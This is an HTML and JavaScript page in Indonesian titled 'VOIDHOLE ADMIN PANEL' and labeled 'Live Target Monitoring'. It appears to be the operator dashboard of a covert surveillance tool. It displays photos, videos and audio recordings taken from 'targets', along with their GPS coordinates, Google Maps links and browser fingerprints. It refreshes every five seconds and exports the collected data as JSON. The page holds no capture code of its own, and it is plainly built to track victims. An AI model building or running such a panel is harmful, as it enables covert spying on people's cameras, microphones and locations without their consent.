<!DOCTYPE html><html lang="id"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>🔴 VOIDHOLE ADMIN PANEL 🔴</title>    <style>        * {            margin: 0;            padding: 0;            box-sizing: border-box;        }                body {            background: #0a0a0a;            font-family: 'Courier New', monospace;            padding: 20px;        }                .header {            background: linear-gradient(135deg, #1a0000, #0a0000);            padding: 20px;            border-bottom: 3px solid #ff0000;            margin-bottom: 20px;        }                h1 {            color: #ff0000;            text-align: center;        }                .stats {            display: grid;            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));            gap: 15px;            margin-bottom: 20px;        }                .stat-card {            background: #1a1a1a;            padding: 20px;            border-radius: 10px;            text-align: center;            border-left: 4px solid #ff0000;        }                .stat-number {            font-size: 36px;            color: #ff0000;            font-weight: bold;        }                .data-list {            background: #1a1a1a;            border-radius: 10px;            overflow: hidden;        }                .data-item {            background: #0a0a0a;            padding: 15px;            margin: 10px;            border-radius: 8px;            border: 1px solid #ff0000;        }                .data-header {            display: flex;            justify-content: space-between;            margin-bottom: 10px;            color: #ff6666;        }                .data-type {            color: #ffaa00;            font-weight: bold;        }                .data-content {            color: #fff;            word-break: break-all;            font-size: 12px;        }                img, video {            max-width: 100%;            border-radius: 8px;            margin-top: 10px;        }                .refresh-btn {            background: #ff0000;            color: white;            padding: 10px 20px;            border: none;            border-radius: 5px;            cursor: pointer;            margin-bottom: 20px;        }                .tab-buttons {            display: flex;            gap: 10px;            margin-bottom: 20px;        }                .tab-btn {            background: #333;            color: white;            padding: 10px 20px;            border: none;            cursor: pointer;        }                .tab-btn.active {            background: #ff0000;        }                .tab-content {            display: none;        }                .tab-content.active {            display: block;        }    </style></head><body>    <div class="header">        <h1>💀 VOIDHOLE ADMIN PANEL 💀</h1>        <p style="text-align: center; color: #ff6666;">Live Target Monitoring</p>    </div>        <div class="stats">        <div class="stat-card">            <div class="stat-number" id="totalTargets">0</div>            <div>Total Target</div>        </div>        <div class="stat-card">            <div class="stat-number" id="totalPhotos">0</div>            <div>Foto Terkumpul</div>        </div>        <div class="stat-card">            <div class="stat-number" id="totalVideos">0</div>            <div>Video Terkumpul</div>        </div>    </div>        <div class="tab-buttons">        <button class="tab-btn active" onclick="switchTab('all')">📋 Semua Data</button>        <button class="tab-btn" onclick="switchTab('photo')">📸 Foto</button>        <button class="tab-btn" onclick="switchTab('video')">🎥 Video</button>        <button class="tab-btn" onclick="switchTab('audio')">🎤 Audio</button>        <button class="tab-btn" onclick="switchTab('location')">📍 Lokasi</button>    </div>        <button class="refresh-btn" onclick="loadData()">🔄 Refresh Data</button>        <div id="allTab" class="tab-content active">        <div class="data-list" id="dataList"></div>    </div>        <div id="photoTab" class="tab-content">        <div class="data-list" id="photoList"></div>    </div>        <div id="videoTab" class="tab-content">        <div class="data-list" id="videoList"></div>    </div>        <div id="audioTab" class="tab-content">        <div class="data-list" id="audioList"></div>    </div>        <div id="locationTab" class="tab-content">        <div class="data-list" id="locationList"></div>    </div>        <script>        let allData = [];                function loadData() {            // Load dari localStorage            const stored = localStorage.getItem('voidhole_data');            if(stored) {                allData = JSON.parse(stored);            } else {                // Data demo                allData = [];            }                        // Update stats            document.getElementById('totalTargets').innerText = allData.length;            document.getElementById('totalPhotos').innerText = allData.filter(d => d.type === 'photo').length;            document.getElementById('totalVideos').innerText = allData.filter(d => d.type === 'video').length;                        // Render semua tab            renderDataList('allTab', allData);            renderDataList('photoTab', allData.filter(d => d.type === 'photo'));            renderDataList('videoTab', allData.filter(d => d.type === 'video'));            renderDataList('audioTab', allData.filter(d => d.type === 'audio'));            renderDataList('locationTab', allData.filter(d => d.type === 'location'));        }                function renderDataList(containerId, data) {            const container = document.getElementById(containerId === 'allTab' ? 'dataList' :                             containerId === 'photoTab' ? 'photoList' :                             containerId === 'videoTab' ? 'videoList' :                             containerId === 'audioTab' ? 'audioList' : 'locationList');                        if(!container) return;                        if(data.length === 0) {                container.innerHTML = '<div style="text-align:center; padding:40px; color:#666;">Belum ada data</div>';                return;            }                        container.innerHTML = data.map((item, idx) => {                let content = '';                if(item.type === 'photo') {                    content = `<img src="${item.data}" alt="Photo">`;                } else if(item.type === 'video') {                    content = `<video controls src="${item.data}" style="max-width:100%"></video>`;                } else if(item.type === 'audio') {                    content = `<audio controls src="${item.data}"></audio>`;                } else if(item.type === 'location') {                    content = `                        <div>📍 Latitude: ${item.lat}</div>                        <div>📍 Longitude: ${item.lng}</div>                        <div>🎯 Akurasi: ${item.accuracy} meter</div>                        <a href="https://www.google.com/maps?q=${item.lat},${item.lng}" target="_blank" style="color:#ff0000">🌍 Buka Google Maps</a>                    `;                } else if(item.type === 'fingerprint') {                    content = `                        <div>🖥️ User Agent: ${item.userAgent}</div>                        <div>📱 Screen: ${item.screenSize}</div>                        <div>🌐 Language: ${item.language}</div>                        <div>💻 Platform: ${item.platform}</div>                        <div>⏰ Timezone: ${item.timezone}</div>                    `;                } else {                    content = `<pre>${JSON.stringify(item, null, 2)}</pre>`;                }                                return `                    <div class="data-item">                        <div class="data-header">                            <span class="data-type">📌 ${item.type.toUpperCase()}</span>                            <span>🕐 ${new Date(item.timestamp).toLocaleString()}</span>                        </div>                        <div class="data-content">                            ${content}                        </div>                    </div>                `;            }).join('');        }                function switchTab(tab) {            // Update tab buttons            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));            event.target.classList.add('active');                        // Update content            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));            document.getElementById(tab + 'Tab').classList.add('active');        }                // Auto refresh setiap 5 detik        setInterval(loadData, 5000);                // Load initial        loadData();                // Export data        function exportData() {            const dataStr = JSON.stringify(allData, null, 2);            const blob = new Blob([dataStr], {type: 'application/json'});            const url = URL.createObjectURL(blob);            const a = document.createElement('a');            a.href = url;            a.download = `voidhole_data_${new Date().toISOString()}.json`;            a.click();            URL.revokeObjectURL(url);        }                // Tambah tombol export        const exportBtn = document.createElement('button');        exportBtn.innerHTML = '📥 Export Data JSON';        exportBtn.style.background = '#333';        exportBtn.style.color = '#fff';        exportBtn.style.padding = '10px 20px';        exportBtn.style.border = 'none';        exportBtn.style.borderRadius = '5px';        exportBtn.style.marginLeft = '10px';        exportBtn.style.cursor = 'pointer';        exportBtn.onclick = exportData;        document.querySelector('.refresh-btn').after(exportBtn);    </script></body></html>
